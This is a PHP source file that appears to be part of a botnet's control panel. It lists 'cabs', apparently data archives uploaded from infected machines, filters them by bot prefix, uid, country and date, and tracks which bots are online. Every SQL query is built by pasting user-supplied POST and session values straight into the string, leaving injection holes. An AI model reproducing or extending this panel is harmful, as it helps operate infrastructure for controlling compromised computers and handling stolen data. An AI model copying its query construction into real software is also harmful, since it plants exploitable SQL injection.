<?php

get_function('html_pages');
get_function('size_format');
get_function('strtotime');
get_function('smarty_assign_add');

if(isset($_POST['type'])){	$_SESSION['ctype'] = $_POST['type'];
}

if(!empty($_SESSION['user']->config['prefix'])){	$_POST['prefix'] = $_SESSION['user']->config['prefix'];
}

if(isset($_POST['prefix'])){	$_SESSION['search'][$_SESSION['ctype']]['prefix'] = $_POST['prefix'];
}

if(isset($_POST['uid'])){	$_SESSION['search'][$_SESSION['ctype']]['uid'] = $_POST['uid'];
}

if(isset($_POST['country'])){	$_SESSION['search'][$_SESSION['ctype']]['country'] = $_POST['country'];
}

if(isset($_POST['date'])){	$_SESSION['search'][$_SESSION['ctype']]['date'] = $_POST['date'];
}

$filter = '';
if(count($_SESSION['search'][$_SESSION['ctype']])){
	if(!empty($_SESSION['search'][$_SESSION['ctype']]['uid'])){
		$uid = explode('0', $_SESSION['search'][$_SESSION['ctype']]['uid'], 2);
		if(!empty($uid[0]) && !empty($uid[1])){
			if(file_exists('cache/prefix/' . strtoupper($uid[0]))){
				$_SESSION['search'][$_SESSION['ctype']]['prefix'] = $uid[0];
				$_SESSION['search'][$_SESSION['ctype']]['uid'] = '0' . $uid[1];
			}
		}
	}

	foreach($_SESSION['search'][$_SESSION['ctype']] as $key => $value){
	    if(!empty($value)){
			switch($key){
				case 'prefix':
					if($value != 'ALL'){
						//if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
						$filter .= ' AND (a.prefix = \''.$value.'\') ';
					}
				break;

				case 'uid':
					if($value != 'ALL'){
						//if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
						$filter .= ' AND (a.uid = \''.$value.'\') ';
					}
				break;

				case 'country':
					if($value != 'ALL'){
						//if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
						$filter .= ' AND (a.country = \''.$value.'\') ';
					}
				break;

				case 'date':
	            	if($value != 'ALL'){
						//if(empty($filter)){ $filter = ' WHERE ';}else{$filter .= ' AND ';}
						$filter .= ' AND (a.post_date LIKE \''.$value.'%\') ';
					}
				break;
			}
	    }
	}
}

if($_SESSION['hidden'] == 'on' && $_SESSION['user']->login == 'SuperAdmin'){
	$chk = '';
	$chk_a = '';
	$chk_where = '';
}else{
	$chk = ' (chk = \'0\') AND ';
	$chk_a = ' (a.chk = \'0\') AND ';
	$chk_where = ' WHERE (chk = \'0\')';
}

if(!empty($_SESSION['user']->config['climit'])){
	$_SESSION['user']->config['climit'] = implode('|', json_decode(base64_decode($_SESSION['user']->config['climit']), true));

	if($_SESSION['user']->config['hunter_limit'] == true){
		$files = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.type, a.country, MAX(a.post_date) post_date, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.type = \''.$_SESSION['ctype'].'\') LIMIT 1) comment FROM bf_cabs a, bf_bots c WHERE'.$chk.'(type REGEXP \'^('.$_SESSION['user']->config['climit'].')$\') AND (a.type = \''.$_SESSION['ctype'].'\') AND (c.prefix = a.prefix) AND (c.uid = a.uid) AND (c.post_id = \''.$_SESSION['user']->id.'\') '.$filter.' GROUP by concat(a.prefix, a.uid) LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['cabs'] : $Cur['page']*$_SESSION['user']->config['cp']['cabs'] . ',' . $_SESSION['user']->config['cp']['cabs']), null, null, false);
	}else{
		$files = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.type, a.country, MAX(a.post_date) post_date, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.type = \''.$_SESSION['ctype'].'\') LIMIT 1) comment FROM bf_cabs a WHERE'.$chk.'(type REGEXP \'^('.$_SESSION['user']->config['climit'].')$\') AND (a.type = \''.$_SESSION['ctype'].'\') '.$filter.' GROUP by concat(a.prefix, a.uid) LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['cabs'] : $Cur['page']*$_SESSION['user']->config['cp']['cabs'] . ',' . $_SESSION['user']->config['cp']['cabs']), null, null, false);
	}

	$country = $mysqli->query_cache('SELECT country from bf_cabs WHERE'.$chk.'(type REGEXP \'^('.$_SESSION['user']->config['climit'].')$\') AND (type = \''.$_SESSION['ctype'].'\') GROUP by country', null, 60, true);
	$date = $mysqli->query_cache('SELECT DATE_FORMAT(post_date, \'%Y-%m-%d\') date from bf_cabs WHERE'.$chk.'(type REGEXP \'^('.$_SESSION['user']->config['climit'].')$\') AND (type = \''.$_SESSION['ctype'].'\') GROUP by DATE_FORMAT(post_date, \'%Y-%m-%d\') ORDER by post_date DESC', null, 60, true);
	$counts = $mysqli->query_name('SELECT COUNT(DISTINCT(CONCAT(prefix,uid))) count FROM bf_cabs WHERE'.$chk.'(type REGEXP \'^('.$_SESSION['user']->config['climit'].')$\') AND (type = \''.$_SESSION['ctype'].'\') '.$filter, null, 'count', 0, true);
	
	$types = $mysqli->query('SELECT DISTINCT(type) type FROM bf_cabs WHERE'.$chk.'(type REGEXP \'^('.$_SESSION['user']->config['climit'].')$\')', null, null, false);
}else{
	if($_SESSION['user']->config['hunter_limit'] == true){
		$files = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.type, a.country, MAX(a.post_date) post_date, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.type = \''.$_SESSION['ctype'].'\') LIMIT 1) comment FROM bf_cabs a, bf_bots c WHERE'.$chk_a.'(a.type = \''.$_SESSION['ctype'].'\') AND (c.prefix = a.prefix) AND (c.uid = a.uid) AND (c.post_id = \''.$_SESSION['user']->id.'\') '.$filter.' GROUP by concat(a.prefix, a.uid) LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['cabs'] : $Cur['page']*$_SESSION['user']->config['cp']['cabs'] . ',' . $_SESSION['user']->config['cp']['cabs']), null, null, false);
	}else{
		$files = $mysqli->query('SELECT a.id, a.prefix, a.uid, a.type, a.country, MAX(a.post_date) post_date, COUNT(a.id) count, (SELECT b.comment FROM bf_comments b WHERE (b.prefix = a.prefix) AND (b.uid = a.uid) AND (b.type = \''.$_SESSION['ctype'].'\') LIMIT 1) comment FROM bf_cabs a WHERE'.$chk_a.'(a.type = \''.$_SESSION['ctype'].'\') '.$filter.' GROUP by concat(a.prefix, a.uid) LIMIT ' . (($Cur['page'] == 0) ? $_SESSION['user']->config['cp']['cabs'] : $Cur['page']*$_SESSION['user']->config['cp']['cabs'] . ',' . $_SESSION['user']->config['cp']['cabs']), null, null, false);
	}

	$country = $mysqli->query_cache('SELECT country from bf_cabs WHERE (type = \''.$_SESSION['ctype'].'\') GROUP by country', null, 60, true);
	$date = $mysqli->query_cache('SELECT DATE_FORMAT(post_date, \'%Y-%m-%d\') date from bf_cabs WHERE'.$chk.'(type = \''.$_SESSION['ctype'].'\') GROUP by DATE_FORMAT(post_date, \'%Y-%m-%d\') ORDER by post_date DESC', null, 60, true);
	$counts = $mysqli->query_name('SELECT COUNT(DISTINCT(CONCAT(prefix,uid))) count FROM bf_cabs WHERE'.$chk.'(type = \''.$_SESSION['ctype'].'\') ' . $filter, null, 'count', 0, true);
	
	$types = $mysqli->query('SELECT DISTINCT(type) type FROM bf_cabs '.$chk_where, null, null, false);
}

if(!empty($_POST['file_name'])){
	$fsearch = $mysqli->query('SELECT a.prefix, a.uid, a.file FROM bf_cabs a WHERE'.$chk.'(type = \''.$_SESSION['ctype'].'\') AND (file = \''.$_POST['file_name'].'\') LIMIT 1');
	if($fsearch->file == $_POST['file_name']){
		$_SESSION['search'][$_SESSION['ctype']]['prefix'] = $fsearch->prefix;
		$_SESSION['search'][$_SESSION['ctype']]['uid'] = $fsearch->uid;
	}
}

if(!file_exists('cache/online_bot.json') || (time() - filemtime('cache/online_bot.json')) >= ($config['live']*60)){
	$online = array();
	function online_check($row){
		global $online;
		$online[$row->prefix][$row->uid] = 1;
	}
	$mysqli->query('SELECT prefix, uid FROM bf_bots WHERE (last_date > \''.(time()-($config['live']*60)).'\')', null, 'online_check');
	file_put_contents('cache/online_bot.json', json_encode($online));
}else{
	$online = json_decode(file_get_contents('cache/online_bot.json'), true);
}
$smarty->assign("online", $online);

$prefix = scandir('cache/prefix/', false);
unset($prefix[0], $prefix[1]);
$smarty->assign("prefix", $prefix);

$smarty->assign('pages', @html_pages('/cabs/index.html?', $counts, $_SESSION['user']->config['cp']['cabs'], 1, 'bots_list', 'this.href'));
$smarty->assign('date',$date);
$smarty->assign('counts',$counts);
$smarty->assign('country',$country);
$smarty->assign('files',$files);
$smarty->assign('Cur', $Cur);
$smarty->assign('types', $types);
$smarty->assign('ctype', $_SESSION['ctype']);

smarty_assign_add("javascript_end", '<script type="text/javascript" src="/js/jquery/jquery.min.js"></script>');
smarty_assign_add("javascript_end", '<script type="text/javascript" src="/js/jquery/thickbox-compressed.js"></script>');
//print_rm($mysqli->sql);
//if($Cur['ajax'] != 1) $smarty->assign('title', $dirs[$Cur['to']]['index'].' - '.$lang[$types]);

?>